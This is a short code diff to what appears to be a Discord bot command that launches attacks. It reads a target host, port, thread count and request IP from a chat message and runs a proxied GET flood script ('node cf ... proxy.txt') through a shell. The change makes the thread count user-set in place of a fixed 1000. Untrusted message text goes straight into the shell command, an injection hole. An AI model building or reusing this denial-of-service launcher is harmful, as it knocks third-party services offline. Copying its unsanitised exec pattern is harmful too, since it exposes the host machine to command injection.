@@ -4,7 +4,8 @@ exports.run = async (client, message, args) => {
 
 const host = message.content.split (" ")[1]
 const port = message.content.split (" ")[2]
-const reqip = message.content.split (" ")[3]
+const thread = message.content.split (" ")[3]
+const reqip = message.content.split (" ")[4]
 const ayarlar = require('../ayarlar.json');
 var room = ayarlar.commandroom;
 
@@ -25,7 +26,7 @@ if(!args[0]) {
 
 // Command attack
 var exec = require('child_process').exec
-exec(`node cf ${host} ${port} 1000 GET proxy.txt ${reqip}`, (error, stdout, stderr) => {
+exec(`node cf ${host} ${port} ${thread} GET proxy.txt ${reqip}`, (error, stdout, stderr) => {
 });
 
 // Start Attacking
